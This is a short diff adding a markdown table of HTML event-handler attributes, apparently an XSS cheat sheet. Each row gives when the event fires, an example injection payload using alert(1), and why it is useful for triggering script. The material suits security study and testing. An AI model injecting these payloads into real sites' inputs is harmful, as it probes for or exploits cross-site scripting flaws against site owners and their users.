@@ -1,0 +1,9 @@
+| Event Attribute | When It Fires                 | Example Payload                      | Why It's Useful                    |
+| --------------- | ----------------------------- | ------------------------------------ | ---------------------------------- |
+| **onload**      | When element finishes loading | `<img src=x onload=alert(1)>`        | Auto-executes without user actions |
+| **onerror**     | When loading fails            | `<img src=a onerror=alert(1)>`       | Easiest and most reliable trigger  |
+| **onfocus**     | When element receives focus   | `<input autofocus onfocus=alert(1)>` | Auto-trigger on page load          |
+| **onclick**     | When user clicks              | `<div onclick=alert(1)>Click</div>`  | For interactive / stored XSS       |
+| **onmouseover** | When cursor hovers            | `<p onmouseover=alert(1)>Hi</p>`     | Trigger by just moving mouse       |
+| **oninput**     | When text is typed            | `<input oninput=alert(1)>`           | Useful in forms                    |
+| **onchange**    | When value changes            | `<select onchange=alert(1)>`         | Great for dropdowns                |
